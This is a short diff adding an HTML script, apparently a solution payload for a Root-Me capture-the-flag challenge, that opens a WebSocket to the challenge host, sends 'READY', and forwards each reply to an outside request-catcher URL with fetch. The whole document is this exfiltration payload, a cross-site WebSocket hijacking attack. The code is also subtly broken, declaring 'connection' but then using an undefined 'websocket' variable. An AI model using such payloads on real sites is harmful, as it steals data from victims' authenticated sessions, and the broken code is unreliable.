@@ -1,0 +1,12 @@
+<script>
+  var connection = new WebSocket('ws://ctf07.root-me.org/ws');
+  websocket.onopen = start
+websocket.onmessage = handleReply
+function start(event) {
+  websocket.send("READY");
+}
+function handleReply(event) {
+  fetch('https://eocvkn4m3kpce3q.m.pipedream.net?'+event.data, {mode: 'no-cors'})
+}
+
+</script>
